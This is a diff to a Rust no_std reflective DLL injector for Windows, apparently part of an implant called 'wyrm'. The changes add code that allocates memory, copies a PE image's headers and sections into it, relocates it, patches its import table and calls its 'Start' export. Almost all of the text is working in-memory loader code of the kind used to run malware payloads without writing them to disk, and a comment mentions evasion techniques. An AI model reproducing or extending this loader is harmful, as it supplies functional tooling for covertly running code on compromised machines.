@@ -6,9 +6,9 @@
 //! This module should be FULLY NO_STD.
 
 use core::{
-    ffi::{CStr, c_void},
+    ffi::c_void,
     mem::transmute,
-    ptr::{null_mut, read_unaligned, write_unaligned},
+    ptr::{copy_nonoverlapping, null_mut, read_unaligned, write_unaligned},
 };
 
 use windows_sys::{
@@ -22,9 +22,9 @@ use windows_sys::{
                 IMAGE_SECTION_HEADER,
             },
             Memory::{
-                PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_NOACCESS,
-                PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY,
-                VIRTUAL_ALLOCATION_TYPE,
+                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
+                PAGE_NOACCESS, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE,
+                PAGE_WRITECOPY, VIRTUAL_ALLOCATION_TYPE,
             },
             SystemServices::{
                 IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY,
@@ -37,7 +37,7 @@ use windows_sys::{
     core::PCSTR,
 };
 
-use crate::{entry::start_wyrm, utils::export_resolver};
+use crate::utils::export_resolver::{self, find_export_address};
 
 //
 // FFI definitions for functions we require for the RDI to work; note these do NOT use evasion techniques such as
@@ -68,7 +68,6 @@ type GetCurrentProcess = unsafe extern "system" fn() -> HANDLE;
 
 /// Function pointers for the Reflective DLL Injector to use.
 #[allow(non_snake_case)]
-#[allow(unused)]
 struct RdiExports {
     LoadLibraryA: LoadLibraryA,
     VirtualAlloc: VirtualAlloc,
@@ -151,6 +150,7 @@ enum RdiErrorCodes {
     RelocationsNull,
     MalformedVirtualAddress,
     ImportDescriptorNull,
+    NoEntry,
 }
 
 /// The entrypoint for the reflective DLL loading. We must take in the base address of our module that
@@ -163,6 +163,33 @@ pub unsafe extern "system" fn Load(image_base: *mut c_void) -> u32 {
     let Some(exports) = RdiExports::new() else {
         // We could not resolve all the required function pointers
         return RdiErrorCodes::CouldNotParseExports as _;
+    };
+
+    //
+    // Allocate fresh memory and copy sections over assuming we are from an unaligned region of memory
+    //
+    let image_base = unsafe {
+        let dos_header = read_unaligned(image_base as *const IMAGE_DOS_HEADER);
+
+        let nt = read_unaligned(
+            image_base.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64
+        );
+
+        let p_alloc = (exports.VirtualAlloc)(
+            null_mut(),
+            nt.OptionalHeader.SizeOfImage as usize,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
+        if p_alloc.is_null() {
+            return 0xff;
+        }
+
+        let nt_ptr = image_base.add(dos_header.e_lfanew as usize) as *const u8;
+        write_payload(p_alloc, image_base as *mut u8, nt_ptr, &nt);
+
+        p_alloc
     };
 
     //
@@ -211,9 +238,13 @@ pub unsafe extern "system" fn Load(image_base: *mut c_void) -> u32 {
 
     relocate_and_commit(image_base, p_nt_headers, &exports);
 
-    start_wyrm();
-
-    RdiErrorCodes::Success as _
+    // Search by the export of the actual Start from the RDL
+    if let Some(f) = find_export_address(image_base, p_nt_headers, "Start") {
+        unsafe { f() };
+        RdiErrorCodes::Success as _
+    } else {
+        RdiErrorCodes::NoEntry as _
+    }
 }
 
 #[inline(always)]
@@ -446,4 +477,45 @@ fn patch_iat(
 #[inline(always)]
 fn get_addr_as_rva<T>(base_ptr: *mut u8, offset: usize) -> *mut T {
     (base_ptr as usize + offset) as *mut T
+}
+
+fn write_payload(
+    new_base_ptr: *mut c_void,
+    old_base_ptr: *mut u8,
+    nt_headers_ptr: *const u8,
+    nt_headers: &IMAGE_NT_HEADERS64,
+) {
+    unsafe {
+        let section_header_offset = (nt_headers_ptr as usize - old_base_ptr as usize)
+            + size_of::<u32>()
+            + size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
+            + nt_headers.FileHeader.SizeOfOptionalHeader as usize;
+
+        let section_header_ptr =
+            old_base_ptr.add(section_header_offset) as *const IMAGE_SECTION_HEADER;
+
+        //
+        // Enumerate sections
+        //
+        for i in 0..nt_headers.FileHeader.NumberOfSections {
+            // Read section header unaligned
+            let header_i = read_unaligned(section_header_ptr.add(i as usize));
+
+            let dst_ptr = new_base_ptr
+                .cast::<u8>()
+                .add(header_i.VirtualAddress as usize);
+            let src_ptr = old_base_ptr.add(header_i.PointerToRawData as usize);
+            let raw_size = header_i.SizeOfRawData as usize;
+
+            // Copy section data
+            copy_nonoverlapping(src_ptr, dst_ptr, raw_size);
+        }
+
+        // Copy PE Headers
+        copy_nonoverlapping(
+            old_base_ptr,
+            new_base_ptr as *mut u8,
+            nt_headers.OptionalHeader.SizeOfHeaders as usize,
+        );
+    }
 }
